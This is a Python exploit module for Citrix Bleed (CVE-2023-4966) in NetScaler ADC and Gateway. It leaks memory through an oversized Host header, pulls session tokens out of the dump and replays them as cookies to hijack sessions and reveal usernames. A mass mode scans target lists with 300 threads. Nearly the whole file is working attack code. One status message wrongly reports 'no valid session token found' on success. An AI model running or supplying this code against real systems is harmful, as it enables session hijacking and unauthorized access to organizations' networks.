import re
import sys
import hexdump
import requests

from modules.io import *
from core.modular import Module
from urllib.parse import urlparse
from alive_progress import alive_bar
from typing import List, Tuple, Optional, TextIO
from concurrent.futures import ThreadPoolExecutor, as_completed

warnings = requests.packages.urllib3
warnings.disable_warnings(warnings.exceptions.InsecureRequestWarning)


class Exploit(Module):
    """
    Exploit targeting the Citrix Bleed vulnerability (CVE-2023-4966).

    Description:
    The Citrix Bleed vulnerability represents a critical security flaw in Citrix NetScaler ADC and Gateway.
    This vulnerability allows attackers to gain unauthorized access, posing a significant threat to the
    confidentiality and integrity of sensitive information. The flaw has been exploited in attacks on
    government networks and financial institutions globally.

    Affected Systems:
    - Netscaler ADC and Netscaler Gateway version 14.1 before 14.1-8.50
    - NetScaler ADC and NetScaler Gateway version 13.1 before 13.1-49.15
    - NetScaler ADC and NetScaler Gateway version 13.0 before 13.0-92.19
    - NetScaler ADC 13.1-FIPS before 13.1-37.164
    - NetScaler ADC 12.1-FIPS before 12.1-55.300
    - NetScaler ADC 12.1-NDcPP before 12.1-55.300

    Impact:
    The impact of the Citrix Bleed vulnerability is severe, with potential for data breaches, unauthorized access,
    and the compromise of critical systems. The vulnerability allows leakage of session tokens, enabling malicious
    actors to gain remote access to devices within an organization's network perimeter without generating logs.
    This access could lead to exfiltration of sensitive information from compromised networks.
    """

    def __init__(self):
        self.name = "CVE-2023-4966"
        self.description = "Sensitive information disclosure in Citrix ADC/Gateway"
        self.author = "Chocapikk"
        self.creation_date = "18-11-2023"

        self.results: List[Tuple[str, str]] = []
        self.stop_requested = False
        self.output_file: Optional[TextIO] = None
        self.verbose = False
        self.valid = False

    def execute(self) -> None:
        try:
            mode = input_data(self.name, "Choose mode (url/mass)")

            if mode.lower() == "url":
                self.url = input_data(
                    self.name, "Enter the Citrix ADC / Gateway target URL"
                )

                verbose_input = input_data(self.name, "Enable verbose mode? (yes/no)")
                self.verbose = verbose_input.lower() == "yes"

                self.dump_memory(self.url)
                for header, result in self.results:
                    if header == "success":
                        print_success(result)
                    elif header == "error":
                        print_error(result)
                    else:
                        print_status(result)

            elif mode.lower() == "mass":
                file_path = input_data(
                    self.name, "Enter the file path containing target URLs"
                )

                try:
                    file = open(file_path, "r")
                    urls = file.read().splitlines()
                except (OSError, FileNotFoundError) as e:
                    print_error(f"Error opening URL file: {e}.")
                    return

                valid_session = input_data(
                    self.name, "Do you want only vaid session cookies? (yes/no)"
                )
                self.valid = valid_session.lower() == "yes"
                save_output = input_data(
                    self.name, "Do you want to save the output to a file? (yes/no)"
                )
                if save_output.lower() == "yes":
                    output_file_path = input_data(
                        self.name, "Enter the output file path"
                    )
                    self.output_file = (
                        open(output_file_path, "w") if output_file_path else None
                    )

                with ThreadPoolExecutor(max_workers=300) as executor, alive_bar(
                    len(urls), bar="smooth", enrich_print=False
                ) as bar:
                    futures = [executor.submit(self.dump_memory, url) for url in urls]

                    for future in as_completed(futures):
                        if self.stop_requested:
                            break
                        for header, result in self.results:
                            if header == "success":
                                print_success(result)
                            elif header == "error":
                                print_error(result)
                            else:
                                print_status(result)
                        future.result()
                        bar()

                if self.output_file:
                    self.output_file.close()

            else:
                print_error("Invalid mode selected. Please choose 'url' or 'mass'.")

        except KeyboardInterrupt:
            self.stop_requested = True

    def print_results(
        self, result: str, is_success: bool = False, is_error: bool = False
    ) -> None:
        if is_success:
            print_success(result)
        elif is_error:
            print_error(result)
        else:
            print_status(result)

        if self.output_file:
            self.output_file.write(result + "\n")

    def normalize_url(self, url: str) -> str:
        if not url.startswith("http://") and not url.startswith("https://"):
            url = f"https://{url}"

        parsed_url = urlparse(url)
        normalized_url = f"{parsed_url.scheme}://{parsed_url.netloc}"
        return normalized_url

    def dump_memory(self, url: str) -> None:
        if self.stop_requested:
            return

        full_url = self.normalize_url(url)
        headers = {"Host": "a" * 24576}

        try:
            r = requests.get(
                f"{full_url}/oauth/idp/.well-known/openid-configuration",
                headers=headers,
                verify=False,
                timeout=10,
            )
            content_bytes = r.content
            if r.status_code == 200 and content_bytes:
                if b"\x00" * 16 in content_bytes:
                    cleaned_content = self.clean_bytes(content_bytes)
                    for _ in range(10):
                        cleaned_content = cleaned_content.replace(
                            b"a" * 65, b""
                        ).replace(b"a" * 32, b"")
                        content_bytes = content_bytes.replace(b"a" * 65, b"").replace(
                            b"a" * 32, b""
                        )

                    if self.verbose:
                        self.results.append(("success", f"Memory Dump for {full_url}"))
                        hex_output = hexdump.hexdump(
                            content_bytes, result="return"
                        ).strip()
                        self.results.extend(
                            [("", line) for line in hex_output.splitlines()]
                        )
                        self.results.append(("success", "End of Dump\n"))

                    session_tokens = self.find_session_tokens(content_bytes)

                    if session_tokens and self.verbose:
                        print_status(
                            "Please wait, testing session tokens... (can take some time)"
                        )

                    valid_token_found = False
                    for token in session_tokens:
                        if self.test_session_cookie(full_url, token):
                            valid_token_found = True
                            break

                    if valid_token_found:
                        self.results.append(
                            (
                                "success",
                                f"Vulnerable to CVE-2023-4966. Endpoint: {full_url}, but no valid session token found.",
                            )
                        )
                    elif not self.valid:
                        self.results.append(
                            (
                                "info",
                                f"Partial memory dump but no valid session token found for {full_url}.",
                            )
                        )

                elif self.verbose:
                    self.results.append(
                        ("error", f"Could not dump memory for {full_url}.")
                    )

        except Exception as e:
            if self.verbose:
                self.results.append(
                    ("error", f"Error processing {full_url}: {str(e)}.")
                )

    def clean_bytes(self, data: bytes) -> bytes:
        return b"".join(bytes([x]) for x in data if 32 <= x <= 126)

    def find_session_tokens(self, content_bytes: bytes) -> List[str]:
        TOKEN_65_PATTERN = re.compile(rb"(?=([a-f0-9]{65}))")
        TOKEN_32_PATTERN = re.compile(rb"(?=([a-f0-9]{32}))")

        sessions_65 = [
            match.group(1).decode("utf-8")
            for match in TOKEN_65_PATTERN.finditer(content_bytes)
            if not match.group(1).startswith(b"a" * 65)
        ]
        sessions_32 = [
            match.group(1).decode("utf-8")
            for match in TOKEN_32_PATTERN.finditer(content_bytes)
            if not match.group(1).startswith(b"a" * 32)
        ]

        combined_sessions = list(dict.fromkeys(sessions_65 + sessions_32))
        return combined_sessions

    def test_session_cookie(self, url: str, session_token: str) -> bool:
        try:
            r = requests.post(
                f"{url}/logon/LogonPoint/Authentication/GetUserName",
                headers={"Cookie": f"NSC_AAAC={session_token}"},
                verify=False,
                timeout=10,
            )

            if r.status_code == 200:
                username = r.text.strip()
                self.results.append(
                    (
                        "success",
                        f"Vulnerable to CVE-2023-4966. Endpoint: {url}, Cookie: {session_token}, Username: {username}",
                    )
                )
                return True
            else:
                return False
        except Exception as e:
            if self.verbose:
                self.results.append(
                    ("error", f"Error testing cookie for {url}: {str(e)}")
                )
            return False
